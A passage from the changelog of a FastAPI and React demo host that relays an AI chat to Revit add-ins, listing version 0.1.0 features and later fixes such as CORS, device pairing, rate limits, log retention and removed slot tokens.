  healthcheck bypasses proxies.
- A malformed `X-LLM-Base-Url` (`https://[::1`, a port out of range) is a 400, not a 500.
- `GET /%00` (a NUL byte in a path the SPA fallback looks up) serves the SPA instead of a 500,
  and an unknown `GET /api/...` is a JSON 404 `{error: "not_found", message}` instead of the
  SPA page with 200. Real routes, `/config.json`, `/health` and the build's files are unchanged.
- `CORS_ORIGINS="*"` no longer allows credentials (the middleware echoed any origin back with
  credentials allowed); an explicit origin list keeps them.
- `GET` and `DELETE /api/v1/bridge/devices/{id}` answer an unknown id with the same 403
  `invalid_device_key` as a wrong key, so a browser cannot probe which devices exist; with the
  admin password an unknown id is still 404. Every admin check compares `X-Admin-Token` in
  constant time (the device routes used `==`).
- Requests for one device no longer queue without bound behind a long one (a confirmation
  dialog holds a device up to three minutes): a request waits for its turn at most its own
  timeout and at most 16 wait at once, then fails as `revit_unreachable` (503) with nothing
  sent and no token consumed. Unauthenticated add-in sockets cannot pile up: an address with 20
  failed handshakes in a minute (wrong token, no auth message in time) or 64 sockets still
  waiting to authenticate is refused before the upgrade, so the close codes 4001/4002/4003 keep
  their meaning. Add-ins that authenticate never count, however often they reconnect.
- A device store that cannot be read for a moment (a later revit-bridge 0.6.x raises `OSError`
  after half a second instead of overwriting `devices.json`, before it writes anything):
  pairing, redeeming a code and revoking a device answer 503 `{error:
  "device_store_unavailable", message}` - nothing changed, the code is not consumed, try again
  - instead of an unhandled 500; the Connect page shows the message and keeps the label and
  the device for a retry (an admin revoke's message no longer vanishes when the list reloads).
  An add-in that connects meanwhile stays connected; only its last-seen time goes unrecorded.
  Before, the error closed the socket and left the device registered in the relay.
- Growth while the host runs: interaction logs older than 90 days are purged daily, not only at
  startup; at most 300 chat sessions are kept (the one idle the longest goes first); an
  `execution` report enters the session and the prompt with at most 16,384 characters of JSON
  (a longer `result` is cut to its head with a note, the verdict fields stay whole; the page
  still gets the whole report back), and only one over 4,194,304 characters is refused with
  422 `invalid_args`; one model call ends after 600 s even when the endpoint keeps trickling
  bytes.
- Skills: a very long name is cut to a 120-byte id when a skill is created instead of failing
  with 500 (a longer id already on disk still opens, changes and deletes; one the file system
  cannot hold is 404), a skill file is replaced whole or not at all (temporary file with the
  mode a plain write gives, then rename), and a file that is not UTF-8 reads as absent (404, as
  the list already skipped it) instead of a 500.
- A round that offers the model no tools (`bridge: false`, or the last round of a turn) no
  longer runs `tool_calls` the model returns anyway: they are logged (`backend.chat`) and
  dropped, and the round ends with the model's text, or an empty assistant message.
- Over a slot, a Revit that is gone or leaves mid-request is a transport failure
  (`ConnectionError`) like over TCP, so the package consumes no confirmation token and
  writes no ledger line for code that never reached Revit; only a reply that does not
  arrive in time is still `success: false, "Timeout ..."`.
- `POST /api/v1/bridge/solidify` and `PUT /api/v1/bridge/tools/{name}` answer
  `422 {"error": "invalid_pack", "problems": [...]}` when the package rejects the pack
  (an undeclared `{placeholder}` in the code, a malformed parameter, an unknown
  validator) instead of 500.
- `CLAUDE.md` gave the package constraint as `revit-bridge>=0.1.0`; it is `>=0.6,<0.7`.

### Removed

- The model's `get_guidance` tool and the skills and lesson pointer in the chat's system prompt
  (the model here writes no code); the task page's code execution path and *Solidify* panel.

- `X-Slot-Id` / `X-Slot-Token` (an `X-Slot-*` header is now 422 `invalid_args`),
  `MAX_SLOTS`, `MCP_BRIDGE_REQUIRE_SLOT_TOKEN`, `MCP_BRIDGE_SLOT_TOKEN_*` (the host
  refuses to start when one is still set, naming `MAX_DEVICES` or the pairing flow),
  and the `./.secrets` mount in `docker-compose.yml`. Existing add-ins must be
  reinstalled once and paired.

- `GET/POST /unit`, `GET /project-units`, `POST /query-revit`: the snapshot's `units`
  and `POST /query` replace them (the Connect page reads units from the snapshot).
  `docs/api-v0.json` is replaced by `docs/api-v1.json`.
- `backend/capabilities.py` (the first-start copy of the packs into `DATA_DIR`).

## [0.1.0] - 2026-09-18

First standalone release of the demo host, split out of the former
`revit-api-rag` monorepo.

### Added

- FastAPI backend that only imports `revit_bridge`: `/api/v1/bridge/*` (capability
  packs, execution behind the sandbox review, model queries, health), the
  WebSocket slot relay for remote add-ins with pre-shared slot tokens, `/api/skills`,
  `/api/logs` (admin) and `/config.json`.
- Bring-your-own-model chat (`/api/chat`): one OpenAI-compatible streaming client;
  `X-LLM-Base-Url` / `X-LLM-Model` / `X-LLM-Key` headers take precedence over
  `LLM_BASE_URL` / `LLM_MODEL` / `LLM_API_KEY`; keys are never stored or logged;
  browser-supplied endpoints must be https unless `LLM_ALLOW_HTTP=1`.
- React SPA with three pages - Connect, Task, Capabilities - that reads its
  configuration from `/config.json` at startup; no build-time API address.
- Single-image `Dockerfile` (Node build + Python runtime, no vector store, no model
  SDK), `docker-compose.yml`, `.env.example`, entrypoint that copies slot token files
  and drops privileges.
- Capability packs are copied from the package into `DATA_DIR/capabilities` on first
  start so edits and solidified packs persist in the data volume.
- `docs/api-v0.json`: exported OpenAPI contract. Backend test suite (no Revit needed).

### Removed (compared with the monorepo server)

- RAG retrieval, code generation, intent classification and orchestration routes,
  Text2Revit, PromptBridge, TextStudio, the API explorer, Gradio, `config.yaml`
  and every `openai` / `google-genai` / `cohere` / `chromadb` dependency.
- `/api/settings` and `/api/config`: model settings are per-request headers now.

[0.1.0]: https://github.com/revitbridge/revit-bridge-web/releases/tag/v0.1.0
